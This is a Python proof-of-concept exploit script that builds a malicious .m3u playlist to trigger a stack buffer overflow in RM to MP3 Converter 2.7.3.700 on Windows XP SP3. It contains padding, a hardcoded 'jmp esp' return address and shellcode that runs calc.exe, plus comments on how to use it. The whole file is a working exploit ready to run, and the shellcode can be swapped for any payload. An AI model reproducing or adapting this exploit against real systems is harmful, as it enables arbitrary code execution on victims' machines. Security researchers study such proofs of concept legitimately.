#!/usr/bin/env python3

# Exploit file to pop calc.exe for RM to MP3 Converter v2.7.3.700 on Windows XP.
# How 2 use:
#   Generate the .m3u file by running this script
#   Load the .m3u file into the RM to MP3 Converter
#   Hope that the exploit works (because it's pretty unreliable :( )
#   If it doesn't work, try again until it does!
#
# Note: executes shellcode in the stack; does NOT defeat DEP.
# Tested on Windows XP SP3.

print("Creating calc.exe exploit file...")

# Uses hardcoded MSVCRT address for `system("calc")`
# from http://shell-storm.org/shellcode/files/shellcode-739.php
exploit = "A"*26074                                                                     # Padding
exploit += "\x27\x3b\xcd\x01"                                                           # Address of `jmp esp` in MSRMCcodec02.dll
exploit += "B"*4                                                                        # More padding
exploit += "\x31\xC9\x51\x68\x63\x61\x6C\x63\x54\xB8\xC7\x93\xC2\x77\xFF\xD0"           # Shellcode (`esp` points here)

# Write the file
with open("exploit.m3u", "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file created!")